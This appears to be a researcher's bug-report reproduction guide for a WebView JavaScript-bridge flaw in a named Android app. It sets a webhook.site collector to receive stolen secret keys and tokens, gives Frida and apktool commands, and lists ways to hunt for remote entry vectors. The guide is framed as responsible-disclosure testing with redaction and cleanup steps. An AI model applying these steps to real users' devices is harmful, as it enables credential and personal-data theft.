# Testing Finding 1 on your own phone

Goal: get **any** page you control to execute JS inside `ZWebKitBridge`, and show it can read
`secret_key` + `user_details` and write app preferences. Everything here is read-only except a
harmless `theme` write — do it on a **throwaway account**.

Files:
- `poc.html` — the page that talks to the bridge (renders results on-screen *and* can POST them to a collector)
- `hook.js` — Frida driver that forces the app's WebView to load your page

---

## 0. Set up (5 min)

1. **Collector** — easiest is a `webhook.site` URL (no server needed), or Burp Collaborator.
   Edit `poc.html`:
   ```js
   var COLLECTOR = "https://webhook.site/<your-uuid>";
   ```
2. **Host the page over HTTPS** — cleartext is blocked by the app's network security config.
   `webhook.site` can't serve your HTML, so use any of: GitHub Pages, Netlify drop, Cloudflare Pages,
   or `ngrok http 8080` + `python -m http.server 8080`. Note the final URL.
3. **Install the app the same way you have it** (splits):
   ```bash
   adb install-multiple base.apk split_config.arm64_v8a.apk
   ```
4. Log in with the throwaway account so `user_details` and the token are populated.

---

## Path A — rooted phone / emulator (recommended, definitive)

This proves the origin-agnostic part cleanly: *an arbitrary external page, loaded into the app's
WebView, gets the bridge.*

```bash
# 1. check you have root
adb shell su -c id          # uid=0(...)  OR  adb root

# 2. push frida-server for your ABI (arm64-v8a / x86_64)
adb push frida-server /data/local/tmp/ && adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"
adb shell "su -c '/data/local/tmp/frida-server &'"

# 3. verify
frida-ps -U | head

# 4. edit POC_URL in hook.js, then run
frida -U -f com.application.zomato.district -l hook.js --no-pause
```

Open any screen that contains a WebView (help / FAQ / terms / a restaurant queue / offer details).
`hook.js` waits 1.5 s after the real page starts loading and then navigates that WebView to your
`poc.html`. Watch the phone screen — the PoC renders its own result cards.

What you should see, in order:

| Card | Meaning |
|---|---|
| `page loaded` (green) | UA contains `ZWebKitContainer` — you are in the bridge WebView |
| `bridge response: userAuthDetails` | JSON containing `"api_key"` and **`"secret_key"`** |
| `bridge response: getUserDetails` | JSON containing `name`, `email_id`, `phone_number`, … |
| `bridge response: getCity` | GPS lat/lng |
| `bridge response: httpRequest` + a hit on your collector | check the collector's request headers for `x-access-token`, `x-refresh-token`, `X-APP-THEME: poc-theme` |

That last one is the double-win: it proves the `shared_prefs` write (the `theme` value you wrote is
echoed back as `X-APP-THEME` by the native client) **and** Finding 2 (tokens on an arbitrary host)
in one request.

If you prefer the DevTools console: `hook.js` also enables WebView debugging, so
`chrome://inspect/#devices` will list the page and you can paste the snippet manually.

**Caveat to state in the report:** Path A demonstrates that the bridge is origin-agnostic; it does not
by itself demonstrate a remote entry point. Combine it with the vector hunt in Path B, or describe the
entry as "any page-load primitive into this WebView (XSS / open redirect / third-party iframe)".

---

## Path B — no root: hunt for a vector

Without root you cannot instrument, so you need the app to load your page on its own. Detect success
**from your web server**, no matter how the page got there:

- The bridge WebViews set a custom UA: `... ZWebKitContainer`
  (`AbstractC14101c.m27160c()` appends it).
- If your access log shows a request with that UA, you are in.

Surfaces worth trying (each opens a `WebViewFragment` / `WebHolderActivity`):

- Help / Contact support / FAQ / "Report an issue" articles
- Terms, Privacy, Refund policy, Responsible disclosure pages
- Offer-wall, offer details, merchant T&C links
- Wallet / rewards / membership T&C
- Restaurant queue / waitlist page (this one is `WebHolderActivity`, which does **not** block
  main-frame navigation at all)
- Story / collection pages with external links
- Any "powered by" / partner link

How to use a surface once you find one with an outbound link:

1. Put your `poc.html` link on a page the app will render (e.g. an offer/merchant URL you control, if
   the surface allows it), or use an open redirect on a whitelisted host
   (`district.in`, `district.insider.in`, `district.ticketnew.com`) that lands on your host.
2. Tap the link and watch for a request with `ZWebKitContainer` UA.
3. If the link instead opens Chrome, that navigation *was* blocked — note it and move on.

Also test the flag directly, because it decides whether the app is exploitable via navigation:

> On a `WebViewFragment` page, tap any external link. If it opens **inside** the app WebView, then
> `shouldEnableDomainCheckForWebUrlLoad` is off and external navigation keeps the bridge attached —
> that is your entry point. If it bounces to Chrome, that specific control is on.

---

## Path C — no root, repackaged build (only if A and B are blocked)

Repackage so WebView debugging is on. This changes the signed app, so it is *evidence of the code path*,
not of the shipped app:

1. `apktool d base.apk -o src`
2. add `android:debuggable="true"` to `<application>` in `src/AndroidManifest.xml`
3. patch `DistrictApp` smali to call `WebView;->setWebContentsDebuggingEnabled(true)V` early
4. `apktool b src -o patched.apk`, sign, `adb install-multiple` the patched base + existing splits
5. `chrome://inspect/#devices` → open the page → run the `poc.html` script body

---

## Evidence to capture for the report

- Video/screenshot: the app screen showing `page loaded` + `bridge response: userAuthDetails` with the
  secret **redacted** (`"secret_key":"eyJ…(redacted)"`).
- The raw `user_details` JSON with phone/email **partially redacted** — enough to show they exist.
- Collector log showing `X-APP-THEME: poc-theme` (proves the pref write) and
  `x-access-token` / `x-refresh-token` (Finding 2).
- Exact steps + app version (`2.79.0`, versionCode `1000027900`) + device/Android version.
- If Path B worked: the precise screen, the link you tapped, and the `ZWebKitContainer` UA in your log.

## Safety / cleanup

- Use a **throwaway account**; do not touch payments, orders, or saved cards.
- Do not put a real `secret_key`, access token, phone or passport number in the report — redact, and
  note that Zomato can confirm server-side from their own logs.
- `ed_p_secret` is issued per token response, so **log out and back in** after testing to rotate it.
- If a test wrote prefs and the app misbehaves: `adb shell pm clear com.application.zomato.district`
  (this wipes the app and logs you out).
- If you only have a rooted device and want to be extra safe, run the whole test in a secondary user
  profile / work profile.
